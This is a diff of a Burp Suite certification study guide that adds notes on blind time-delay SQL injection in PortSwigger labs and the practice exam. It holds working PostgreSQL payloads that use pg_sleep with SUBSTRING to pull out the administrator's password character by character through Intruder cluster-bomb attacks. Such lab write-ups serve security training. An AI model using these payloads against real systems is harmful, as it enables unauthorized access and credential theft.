@@ -1567,7 +1567,7 @@ csrf=TOKEN&username=administrator
 
 >Blind SQL injection with time delays is tricky to ***identify***, fuzzing involves educated guessing as OffSec also taught me in OSCP. The below payload will perform conditional case to delay the response by 10 seconds if positive SQL injection ***identified***. 
 
->Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`, but `SQLMAP` no longer since March 2023 able to identify and exploit the vulnerability.   
+>Identify SQLi vulnerability. In [Burp Practice exam Stage 2](https://portswigger.net/web-security/certification/takepracticeexam/index.html) the advance search filters are vulnerable to `PostgreSQL`, but `SQLMAP` no longer since March 2023 able to identify and exploit the vulnerability. Manual exploit sql injection time delay in [Practice Exam here](#practice-exam-postgresql-timedelay).  
 
 ```SQL
 ;SELECT CASE WHEN (1=1) THEN pg_sleep(7) ELSE pg_sleep(0) END--
@@ -1587,17 +1587,33 @@ csrf=TOKEN&username=administrator
 
 ![blind-time-delay SQLi](images/blind-time-delay.png)  
 
->Using Cluster Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.  
+>Using CLUSTER Bomb attack to re-run the attack for each permutation of the character positions in the password, and to determine character value.  
 
 ```SQL
 ;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 ```  
 
->Using cluster bomb attack type with two payload, first for the length of the password ` 1..20 ` and then second using characters ` a..z ` and numbers ` 0..9 `. Add the **Response Received** column to the intruder attack results to sort by and observe the ` 10 ` seconds or  more delay as positive response.  
+>Using CLUSTER bomb attack type with two payload, first for the length of the password ` 1..20 ` and then second using characters ` a..z ` and numbers ` 0..9 `. Add the **Response Received** column to the intruder attack results to sort by and observe the ` 10 ` seconds or  more delay as positive response.  
 
-![blind cluster bomb SQLi](images/blind-cluster-bomb.png)  
+![blind CLUSTER bomb SQLi](images/blind-cluster-bomb.png)  
 
 [PortSwigger Lab: Blind SQL injection with time delays and information retrieval](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)  
+
+#### Practice Exam PostgreSQL TimeDelay  
+
+>In the Burp Practice exam stage 2 the SQL injection is escaped not using single quote ` ' ` but using a semicolon `;` and then URL encoding it as `%3B`.  
+
+```SQL
+%3BSELECT+pg_sleep(7)--
+```  
+
+![practice-exam-stage-2-timedelay-sqli.png](images/practice-exam-stage-2-timedelay-sqli.png)  
+
+>With a Intruder CLUSTER bomb attack the password can be extracted in one single attack with two payload positions in the below payload.  
+
+```SQL
+;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--
+```  
 
 ### Blind SQLi  
 
@@ -1661,9 +1677,9 @@ TrackingId=xxx'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encod
 
 ![sqli conditional response](images/sqli-conditional-response.png)  
 
->Alternative use a **Cluster Bomb** attack and setting **two** payload positions, first one for the character position with a payload of numbers ```1..20``` and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.  
+>Alternative use a **CLUSTER Bomb** attack and setting **two** payload positions, first one for the character position with a payload of numbers ```1..20``` and the second position, using alpha and number characters, this will iterate through each permutation of payload combinations.  
 
-![cluster bomb](images/cluster-bomb.png)  
+![CLUSTER bomb](images/cluster-bomb.png)  
 
 [PortSwigger Lab: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)  
   
